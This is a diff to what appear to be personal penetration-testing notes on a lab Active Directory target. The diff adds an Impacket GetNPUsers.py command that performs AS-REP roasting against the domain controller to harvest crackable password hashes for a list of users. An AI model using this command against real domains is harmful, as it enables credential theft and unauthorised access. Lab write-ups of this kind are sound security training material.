@@ -36,6 +36,9 @@ we have to provide the Domain name and not the host name for the attack
 ![[Pasted image 20240501054417.png]]
 
 ASProasting
+```
+GetNPUsers.py EGOTISTICALBANK/ -usersfile valid_user.txt -format john -dc-ip 10.10.10.175
+```
 ![[Pasted image 20240501054433.png]]
 
 ```
